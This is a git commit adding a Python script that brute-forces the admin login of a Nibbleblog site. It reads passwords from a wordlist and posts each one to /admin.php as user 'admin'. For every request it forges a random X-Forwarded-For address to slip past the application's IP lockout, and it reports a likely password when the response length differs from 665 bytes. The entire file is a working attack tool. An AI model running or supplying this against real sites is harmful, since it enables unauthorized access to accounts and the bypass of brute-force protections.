9615e93298c91494b4d6f4e0b3e7088fba5dbb36
checkymander <26147220+checkymander@users.noreply.github.com>
2018-06-13 18:15:54 -0400

    Update nibbleblogbruteforcer.py
    actually putting the script in here.

--- nibbleblogbruteforcer.py
+++ nibbleblogbruteforcer.py
@@ -1,1 +1,22 @@
-test
+import requests
+import sys
+import random
+import json
+
+username = "admin"
+currentIP = '127.0.0.1'
+counter = 0
+
+password = ""
+url = sys.argv[1]
+wordlist = sys.argv[2]
+f = open(wordlist,'r')
+with open(wordlist, 'r') as f:
+    for line in f:
+        currentIP = ".".join(map(str,(random.randint(0,255) for _ in range (4))))
+        header = {"X-Forwarded-For":currentIP}
+        password = line
+        r = requests.post(url + "/admin.php",data={'username':username,'password':password},headers=header)
+        
+        if int(r.headers["content-length"]) != 665:
+            print "Possible Password Found: " + password
